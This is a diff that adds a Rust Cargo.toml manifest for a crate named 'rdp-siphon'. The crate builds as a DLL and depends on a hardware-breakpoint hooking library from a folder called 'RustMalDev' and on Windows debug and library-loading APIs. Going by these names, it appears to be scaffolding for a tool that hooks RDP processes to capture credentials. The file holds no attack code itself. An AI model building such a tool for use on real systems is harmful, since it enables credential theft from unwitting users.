@@ -1,0 +1,21 @@
+[package]
+name = "rdp-siphon"
+version = "0.1.0"
+edition = "2024"
+
+[lib]
+crate-type = ["cdylib"]
+
+[dependencies]
+hwbp = { path = "../RustMalDev/hooking/hwbp" }
+log = "0.4"
+fern = "0.7.1"
+windows-sys = { version = "0.61", features = [
+  "Win32_Foundation",
+  "Win32_System_Diagnostics_Debug",
+  "Win32_System_LibraryLoader",
+  "Win32_System_SystemServices",
+  "Win32_UI_Shell",
+  "Win32_UI_WindowsAndMessaging",
+] }
+chrono = "0.4.42"
